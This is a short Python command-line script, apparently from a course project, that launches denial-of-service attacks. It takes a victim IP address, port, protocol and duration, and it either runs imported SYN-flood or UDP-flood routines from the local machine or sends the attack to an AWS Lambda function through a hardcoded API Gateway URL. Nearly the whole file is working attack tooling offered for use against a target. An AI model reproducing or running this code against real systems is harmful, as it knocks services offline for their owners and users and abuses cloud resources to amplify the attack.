import click
import json
import requests
import syn_flood
import udp_flood

# Configure CLI options
@click.command()
@click.option('--aws', help='Use AWS Lambda to perform the attack.', is_flag=True)
@click.option('-P', '--protocol', default='udp', type=click.Choice(['udp', 'tcp']),
			  help='Protocol to use for attack. udp by default.')
@click.option('-i', '--ip', required=True, help='Global IP address of victim.')
@click.option('-p', '--port', default=80, type=int, help='Target port on victim\'s machine. 80 by default.')
@click.option('-t', '--time', default=5, type=int, 
			  help='Number of seconds to attack for. 5 by default, max of 15.')


# Entry function from CLI
def ddos(aws, protocol, ip, port, time):
	t = min(time, 15)

	if aws:
		resp = aws_attack(protocol, ip, port, time)
		count = resp.json()['body']
		attack = 'UDP' if protocol == 'udp' else 'SYN'
		print("Sent %s %s packets on AWS Lambda" % (count, attack))

	else:
		if protocol == 'tcp':
			syn_flood.syn_flood(ip, port, time)
		else:
			udp_flood.udp_flood(ip, port, time)


# This calls a Lambda function using an endpoint generated by API Gateway on AWS
def aws_attack(protocol, ip, port, t):

	# This disgusting dict is necessary bc marshalling prevents more than 1 key
	headers = { 'ip': str(ip) + ' ' + str(port) + ' ' + protocol + ' ' + str(t) }
	url = 'https://295m1151n5.execute-api.us-east-1.amazonaws.com/default/cs460-project'

	response = requests.get(url, headers=headers)
	return response


ddos()
